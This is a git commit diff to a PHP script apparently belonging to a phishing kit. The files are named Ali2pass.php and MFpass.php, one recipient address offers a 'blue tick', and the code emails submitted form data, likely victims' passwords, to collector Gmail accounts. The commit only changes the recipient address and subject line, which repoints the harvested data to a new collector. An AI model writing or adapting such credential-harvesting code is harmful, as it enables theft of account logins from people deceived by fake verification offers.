d123994d81488128dd20dc1755427b88c874e813
Uzr44911 <ahmjtalijaan@gmail.com>
2025-08-08 17:28:12 +0500

    Update and rename Ali2pass.php to MFpass.php

--- MFpass.php
+++ MFpass.php
@@ -35,14 +35,14 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email properties
         $mail->setFrom('Lernayouamzaxal@gmail.com', 'Ghaliya');
-        $mail->addAddress('get.blue.tick.opportunity8382@gmail.com');
+        $mail->addAddress('mlovemmjanm416@gmail.com');
         $mail->addAddress('Lernayouamzaxal@gmail.com');
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'ali2';
+        $mail->Subject = 'mf';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
 
